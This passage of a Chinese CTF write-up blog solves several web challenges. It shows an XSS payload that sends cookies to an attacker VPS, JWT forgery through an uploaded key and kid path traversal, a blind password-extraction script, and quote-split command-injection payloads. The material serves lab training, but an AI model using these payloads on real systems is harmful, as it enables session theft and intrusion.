class="hljs-keyword">var</span> url = [<span class="hljs-built_in">String</span>.fromCharCode(<span class="hljs-comment">/*此处填vps构造的URL，例如http://1.1.1.1/?cookie=*/</span>), <span class="hljs-built_in">document</span>.cookie];</span><br><span class="javascript">    img.src = url.join();</span><br><span class="javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0048/1713008409279-4f6be027-d1b0-4f9b-9eab-82b6e82bdf0c.png" alt="img" /></p><h2 id="imagehostjwt伪造">imagehost（JWT伪造）</h2><p>程序的逻辑如下</p><ol type="1"><li>flag位于uploads目录下，数据库对应用户id是1 -&gt; 只有admin用户可以直接看到对应的flag文件名。</li><li>可以注册用户，使用JWT来做身份验证（私钥不可读）</li><li>文件上传之后会保存为<code>/uploads/uuid.后缀</code>，每个用户可以看到自己上传的文件</li></ol><p>一个直接的思路就是伪造JWT从而实现身份的绕过</p><p>在JWT函数这里发现疑似可以<strong>利用文件上传制作私钥，从而绕过session检查</strong></p><p>具体的Session处理函数，这里解密是通过读取JWT中的<code>kid</code>字段实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br><br><span class="hljs-keyword">import</span> jwt<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span>(<span class="hljs-params">payload, public_key: Path, private_key: Path</span>):</span><br>key = private_key.read_bytes()<br><span class="hljs-keyword">return</span> jwt.encode(payload=payload, key=key, algorithm=<span class="hljs-string">&quot;RS256&quot;</span>, headers=&#123;<span class="hljs-string">&quot;kid&quot;</span>: <span class="hljs-built_in">str</span>(public_key)&#125;)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span>(<span class="hljs-params">token</span>):</span><br>headers = jwt.get_unverified_header(token)<br>public_key = Path(headers[<span class="hljs-string">&quot;kid&quot;</span>])<br><span class="hljs-keyword">if</span> public_key.absolute().is_relative_to(Path.cwd()):<br>key = public_key.read_bytes()<br><span class="hljs-keyword">return</span> jwt.decode(jwt=token, key=key, algorithms=[<span class="hljs-string">&quot;RS256&quot;</span>])<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> &#123;&#125;<br></code></pre></td></tr></table></figure><p>利用思路如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">本地伪造公私密钥对 -&gt; 上传公钥 -&gt; 本地使用私钥伪造JWT -&gt; 服务器根据上传的公钥验证<br></code></pre></td></tr></table></figure><h3 id="密钥图片上传">密钥图片上传</h3><p>本地生成密钥对</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">openssl genrsa -out app/private_key.pem <span class="hljs-number">4096</span> &amp;&amp; openssl rsa -<span class="hljs-keyword">in</span> app/private_key.pem -pubout -out app/public_key.pem<br></code></pre></td></tr></table></figure><p>上传的文件除了后缀名之类的限制，关键在于要绕过IMAGE库的检查</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    img = Image.<span class="hljs-built_in">open</span>(image.file)<br><span class="hljs-keyword">except</span> Exception:<br>    <span class="hljs-keyword">return</span> RedirectResponse(<span class="hljs-string">&quot;/?error=Invalid+file&quot;</span>, <span class="hljs-number">303</span>)<br></code></pre></td></tr></table></figure><p>采用dd命令实现二进制文件拼接，类似图片马的制作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">dd <span class="hljs-keyword">if</span>=<span class="hljs-number">1.</span>png of=public_key.png bs=1M conv=notrunc<br>dd <span class="hljs-keyword">if</span>=public_key.pem of=public_key.png bs=1M conv=notrunc oflag=append<br></code></pre></td></tr></table></figure><h3 id="jwt伪造">JWT伪造</h3><p>上传图片，根据<code>view/</code>下的路由信息获取到上传后的文件名</p><p>修改对应的JWT，注意源代码<code>decode</code>函数中存在相对路径的检查，因此这里得采用相对路径来完成绕过。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fake</span>(<span class="hljs-params">payload, public_key: Path, private_key: Path</span>):</span><br>key = private_key.read_bytes()<br><span class="hljs-keyword">return</span> jwt.encode(payload=payload, key=key, algorithm=<span class="hljs-string">&quot;RS256&quot;</span>, headers=&#123;<span class="hljs-string">&quot;kid&quot;</span>: <span class="hljs-string">&quot;../uploads/5880d5d2-6728-4ad8-95c4-e834c089afff.png&quot;</span>&#125;)<br><br><br>payload = &#123;<br>  <span class="hljs-string">&quot;user_id&quot;</span>: <span class="hljs-number">1</span>,<br>  <span class="hljs-string">&quot;admin&quot;</span>: <span class="hljs-literal">True</span><br>&#125;<br><br><span class="hljs-comment"># jwt_data = encode(payload, Path(&quot;../../../../../../tmp/public_key.png&quot;), Path(&quot;private_key.pem&quot;))</span><br><span class="hljs-comment"># print(jwt_data)</span><br><span class="hljs-comment"># print(decode(jwt_data))</span><br><br>jwt_data = fake(payload, Path(<span class="hljs-string">&quot;public_key.pem&quot;</span>), Path(<span class="hljs-string">&quot;private_key.pem&quot;</span>))<br><span class="hljs-built_in">print</span>(jwt_data)<br></code></pre></td></tr></table></figure><p>使用对应Session访问，获取flag</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0048/1713008371297-b8f58e07-2ec5-4c35-817a-b92061f2e30b.png" alt="img" /></p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0048/1713008401469-9aa776a2-ad3c-4d88-9846-1b884ad14958.png" alt="img" /></p><h2 id="casino逻辑漏洞">Casino（逻辑漏洞）</h2><p>注册之后是一个类似赌场的地方，找到获取flag的路由，要求我们的<code>username</code>是<code>admin</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/grab_flag&quot;</span>, methods = [<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">grab_flag</span>():</span><br>    jwt_token = request.cookies.get(<span class="hljs-string">&#x27;jwt&#x27;</span>)<br>    <span class="hljs-keyword">if</span> jwt_token == <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> is_valid_token(jwt_token, app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>]):<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;Unauthorized&#x27;</span>&#125;), <span class="hljs-number">403</span><br>    payload = decode_token(jwt_token, app.config[<span class="hljs-string">&quot;SECRET_KEY&quot;</span>])<br>    <span class="hljs-keyword">if</span> (payload[<span class="hljs-string">&quot;username&quot;</span>] != <span class="hljs-string">&quot;admin&quot;</span>):<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;Unauthorized&#x27;</span>&#125;), <span class="hljs-number">403</span><br>    <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;flag&quot;</span>: app.config[<span class="hljs-string">&quot;FLAG&quot;</span>]&#125;)<br></code></pre></td></tr></table></figure><ol type="1"><li>直接伪造JWT的希望不大，因为都使用成熟API</li><li><code>update_passwd</code>无法修改admin的密码</li></ol><p>找到一个<code>slots</code>接口，可以直接修改对应的账户余额，但是并不能拿到flag</p><p>再回头来看，发现存在一个<code>scoreboard</code>的功能点，可以看到这里的<code>balance</code>、<code>fullname</code>我们都可以控制，密码也可以通过<code>update_password</code>进行直接的hash值修改，关键的一点在于Admin用户输出的fullname和它用于比较的fullname是不同的，则可以通过排序盲注获取<code>admin_password</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fetchScoreboard</span>():</span><br>    conn = sqlite3.connect(<span class="hljs-string">&quot;casino.db&quot;</span>)<br>    cur = conn.cursor()<br>    cur.execute(<span class="hljs-string">&quot;SELECT fullname, password, balance, username FROM casino&quot;</span>)<br>    scoreboard = cur.fetchall()<br>    <br>    <span class="hljs-comment"># Convert list of tuples to list of dictionaries</span><br>    scoreboard_dicts = []<br>    admin_password = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> scoreboard:<br>        fullname = row[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">if</span> row[<span class="hljs-number">3</span>] == <span class="hljs-string">&quot;admin&quot;</span>:<br>            admin_password = row[<span class="hljs-number">1</span>]<br>        scoreboard_dicts.append(&#123;<br>            <span class="hljs-string">&#x27;fullname&#x27;</span>: fullname,<br>            <span class="hljs-string">&#x27;password&#x27;</span>: row[<span class="hljs-number">1</span>],<br>            <span class="hljs-string">&#x27;balance&#x27;</span>: row[<span class="hljs-number">2</span>]<br>        &#125;)<br>    <span class="hljs-comment"># Sorting list of dictionaries</span><br>    <span class="hljs-comment"># 通过此处排序盲注flag</span><br>    scoreboard_sorted = <span class="hljs-built_in">sorted</span>(scoreboard_dicts, key=<span class="hljs-keyword">lambda</span> x: (x[<span class="hljs-string">&#x27;balance&#x27;</span>], x[<span class="hljs-string">&#x27;fullname&#x27;</span>], x[<span class="hljs-string">&#x27;password&#x27;</span>]), reverse=<span class="hljs-literal">True</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Admin password is <span class="hljs-subst">&#123;admin_password&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-built_in">len</span>(scoreboard_sorted)):<br>        <span class="hljs-built_in">print</span>(scoreboard_sorted[i])<br>        <span class="hljs-keyword">if</span> scoreboard_sorted[i][<span class="hljs-string">&#x27;password&#x27;</span>] == admin_password:<br>            scoreboard_sorted[i][<span class="hljs-string">&#x27;fullname&#x27;</span>] = <span class="hljs-string">&quot;The Real Captain Baccarat&quot;</span><br>    <span class="hljs-keyword">return</span> scoreboard_sorted<br></code></pre></td></tr></table></figure><p>如图所示，伪造用户<code>Captain Baccarat</code>，通过修改密码来改变顺序</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0048/1713024094277-a8d456e7-869f-4a5b-9e30-463dbc32b722.png" alt="img" /></p><p>尝试写脚本来实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br><br>url = <span class="hljs-string">&quot;https://boilerscasino-45b36738dbafc018.instancer.b01lersc.tf&quot;</span><br><span class="hljs-comment"># &quot;http://127.0.0.1:5000&quot;</span><br><br>proxies = &#123;<br>    <span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>,<br>    <span class="hljs-string">&quot;https&quot;</span>:<span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span><br>&#125;<br><br><span class="hljs-comment"># 密码</span><br>password = <span class="hljs-string">&quot;f&quot;</span> * <span class="hljs-number">64</span><br><br><span class="hljs-comment"># 注册用户</span><br>userinfo = &#123;<br>    <span class="hljs-string">&quot;fullname&quot;</span>:<span class="hljs-string">&quot;Captain Baccarat&quot;</span>,<br>    <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;whistle&quot;</span>,<br>    <span class="hljs-string">&quot;password&quot;</span>: password<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">register</span>():</span><br>    router = <span class="hljs-string">&quot;/register&quot;</span><br>    r = requests.post(  url=url + router,<br>                        json = userinfo,<br>                        proxies=proxies,<br>                        verify=<span class="hljs-literal">False</span><br>                    )<br>    <span class="hljs-built_in">print</span>(r.text)<br><br><span class="hljs-comment"># 登录获取jwt</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>():</span><br>    router = <span class="hljs-string">&quot;/login&quot;</span><br>    r = requests.post(url = url + router,<br>                    json=userinfo,<br>                    proxies=proxies,<br>                    verify=<span class="hljs-literal">False</span><br>                    )<br>    <span class="hljs-keyword">return</span> json.loads(r.text)<br><br><span class="hljs-comment"># 修改余额</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">changeBalance</span>():</span><br>    router = <span class="hljs-string">&quot;/slots&quot;</span><br>    change_info = &#123;<br>        <span class="hljs-string">&quot;change&quot;</span>:<span class="hljs-number">999500</span><br>    &#125;<br>    r = requests.post(<br>        url = url + router,<br>        json = change_info,<br>        cookies = cookies,<br>        proxies = proxies,<br>        verify=<span class="hljs-literal">False</span><br>    )<br><br><span class="hljs-comment"># 修改密码</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">changePassword</span>():</span><br>    <span class="hljs-keyword">global</span> password, cookies<br>    router = <span class="hljs-string">&quot;/update_password&quot;</span><br>    brute_list = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;0123456789abcdef&#x27;</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>        <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> brute_list:<br>            data = &#123;<br>                <span class="hljs-string">&quot;new_password&quot;</span> : password[:i] + ch + password[i + <span class="hljs-number">1</span>:]<br>            &#125;<br>            loop = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">while</span> loop:<br>                <span class="hljs-keyword">try</span>:<br>                    r = requests.post(<br>                        url = url + router,<br>                        json = data,<br>                        cookies = cookies,<br>                        proxies = proxies,<br>                        verify = <span class="hljs-literal">False</span><br>                    )<br>                    loop = <span class="hljs-literal">False</span><br>                <span class="hljs-keyword">except</span>:<br>                    <span class="hljs-keyword">pass</span><br><br>            admin_index, my_index = getScoreboard()<br>            <br>            <span class="hljs-comment"># 我的index小 -&gt; 排序超过admin</span><br>            <span class="hljs-comment"># 等于的时候说明存在两个The Real Captain Baccarat，即password已经获取到了</span><br>            <span class="hljs-keyword">if</span> admin_index &gt;= my_index:<br>                password = password[:i] + ch + password[i + <span class="hljs-number">1</span>:]<br>                userinfo[<span class="hljs-string">&#x27;password&#x27;</span>]=password<br>                <span class="hljs-comment"># 及时更新cookie，有效期300s</span><br>                cookies = login()<br>                <span class="hljs-built_in">print</span>(password)<br>                <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># 获取scoreboard</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getScoreboard</span>():</span><br>    router = <span class="hljs-string">&quot;/scoreboard&quot;</span><br>    loop =<span class="hljs-literal">True</span><br>    <span class="hljs-keyword">while</span> loop:<br>        <span class="hljs-keyword">try</span>:<br>            r = requests.get(<br>                url = url + router,<br>                cookies = cookies,<br>                proxies = proxies,<br>                verify = <span class="hljs-literal">False</span><br>            )<br>            loop = <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>    admin_index = r.text.find(<span class="hljs-string">&quot;The Real Captain Baccarat&quot;</span>)<br>    <span class="hljs-keyword">if</span> r.text.find(<span class="hljs-string">&quot;The Real Captain Baccarat&quot;</span>, admin_index + <span class="hljs-number">1</span>) != -<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> (admin_index, admin_index)<br>    my_index = r.text.find(<span class="hljs-string">&quot;Captain Baccarat&quot;</span>)<br>    <span class="hljs-keyword">return</span> (admin_index, my_index)<br><br><span class="hljs-comment"># 获取flag</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getFlag</span>():</span><br>    router = <span class="hljs-string">&quot;/grab_flag&quot;</span><br>    r = requests.get(<br>        url = url + router,<br>        cookies = cookies,<br>        proxies = proxies,<br>        verify = <span class="hljs-literal">False</span><br>    )<br>    <span class="hljs-built_in">print</span>(r.text)<br><br><br>register()<br>cookies = login()<br><span class="hljs-built_in">print</span>(cookies)<br>changeBalance()<br>changePassword()<br>userinfo[<span class="hljs-string">&#x27;username&#x27;</span>]=<span class="hljs-string">&#x27;admin&#x27;</span><br>cookies = login()<br>getFlag()<br><br><span class="hljs-comment"># admin_password:ce20ba126fafb9d808d74457bfc9f32c3a50452b1a27bf8dd03c685adfef39d9</span><br><span class="hljs-comment"># &#123;&quot;flag&quot;:&quot;bctf&#123;how_can_a_casino_put_that_much_trust_on_client_uhmm_clientside&#125;&quot;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="city-elevs-writeup">3-city-elevs-writeup</h2><p>这题其实有点没太看懂，核心代码显然是这段，存在一个waf</p><p>waf中的命令可以通过双引号拼接字符串绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/pentest_submitted_flags&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">submit</span>():</span><br>    <span class="hljs-keyword">if</span> request.is_json:<br>        <span class="hljs-comment"># Retrieve JSON data</span><br>        data = request.json<br>        content = data[<span class="hljs-string">&quot;content&quot;</span>]<br>        <span class="hljs-built_in">print</span>(content)<br>        <span class="hljs-keyword">if</span> sus(content):<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;The requested URL was rejected. Please consult with your administrator.&quot;</span>&#125;), <span class="hljs-number">200</span><br>        <span class="hljs-keyword">else</span>:<br>            filename = <span class="hljs-string">&quot;writeup_&quot;</span> + secrets.token_urlsafe(<span class="hljs-number">50</span>)<br>            os.system(<span class="hljs-string">f&quot;bash -c \&#x27;echo \&quot;<span class="hljs-subst">&#123;content&#125;</span>\&quot; &gt; <span class="hljs-subst">&#123;filename&#125;</span>\&#x27;&quot;</span>)<br>            <span class="hljs-comment"># Like I care about your writeup</span><br>            os.system(<span class="hljs-string">f&quot;rm -f writeup_<span class="hljs-subst">&#123;filename&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Writeup submitted successfully&quot;</span>&#125;), <span class="hljs-number">200</span><br><br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;Request data must be in JSON format&#x27;</span>&#125;), <span class="hljs-number">400</span><br></code></pre></td></tr></table></figure><p>RCE将结果输出到文件中，如下payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/pentest_submitted_flags</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.80.128:5000<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>59<br><br><span class="swift">&#123;<span class="hljs-string">&quot;content&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-subst">\&quot;</span>;c<span class="hljs-subst">\&quot;</span><span class="hljs-subst">\&quot;</span>d as<span class="hljs-subst">\&quot;</span><span class="hljs-subst">\&quot;</span>sets;l<span class="hljs-subst">\&quot;</span><span class="hljs-subst">\&quot;</span>s&gt;2;e<span class="hljs-subst">\&quot;</span><span class="hljs-subst">\&quot;</span>cho <span class="hljs-subst">\&quot;</span>&quot;</span>&#125;</span><br><span class="swift"></span><br><span class="swift"># <span class="hljs-type">GET</span> <span class="hljs-operator">/</span><span class="hljs-keyword">static</span><span class="hljs-operator">/</span><span class="hljs-number">2</span> <span class="hljs-type">HTTP</span><span class="hljs-operator">/</span><span class="hljs-number">1.1</span></span><br></code></pre></td></tr></table></figure><p>waf绕过的难点在于跨目录的<code>/</code>被禁止了，我们无法跨目录访问文件</p><p>考虑采用base64来实现</p><p>形如如下命令</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"># 列举目录<br>&#123;<br>  <span class="hljs-attr">&quot;content&quot;</span>:<span class="hljs-string">&quot;\&quot;;c\&quot;\&quot;d as\&quot;\&quot;sets;l\&quot;\&quot;s `e\&quot;\&quot;cho \&quot;Li4vLi4vCg==\&quot;|ba\&quot;\&quot;se64 -d`&gt;3;e\&quot;\&quot;cho \&quot;&quot;</span><br>&#125;<br><br># 拷贝/flag.png<br>&#123;<span class="hljs-attr">&quot;content&quot;</span>:<span class="hljs-string">&quot;\&quot;;c\&quot;\&quot;d as\&quot;\&quot;sets;c\&quot;\&quot;p `e\&quot;\&quot;cho \&quot;F5TGYYLHFZYG4ZYK\&quot;|ba\&quot;\&quot;se32 -d` 4;e\&quot;\&quot;cho \&quot;&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0048/1713191501645-a87379c8-e081-4688-89c2-f41230fd841f.png" alt="img" /></p><p>bctf{lucky_you_I_did_not_code_this_stuff_in_Ruby_lasudkjklhdsfkhjkae}</p><h2 id="pwnhubssti绕过">pwnhub（SSTI绕过）</h2><p>查看源码，得到程序的逻辑如下</p><ol type="1"><li>用户数据通过内存的字典进行管理，权限由<code>verifaction</code>字段控制</li><li>上传内容的id可以计算（超过20需要自行计算）</li><li><code>view/&#123;id&#125;</code>接口存在SSTI，但是需要<code>admin</code>权限和绕过<code>waf</code></li></ol><p>利用思路相对比较明确</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">绕过admin的身份校验 -&gt; 上传绕过waf的content -&gt; 计算content的<span class="hljs-built_in">id</span> -&gt; 渲染content实现利用<br></code></pre></td></tr></table></figure><p>首先是绕过admin的身份校验，这里我们可以看到<code>secret_key</code>的长度只有20bit，我们是可以使用爆破方法获取到对应的key，从而进行伪造身份的。</p><p>重点在于针对waf的绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">INVALID = [<span class="hljs-string">&quot;&#123;&#123;&quot;</span>, <span class="hljs-string">&quot;&#125;&#125;&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;x&quot;</span>]<br></code></pre></td></tr></table></figure><p>这里采用attr的方式进行绕过</p><figure class="highlight python"><table><tr><td 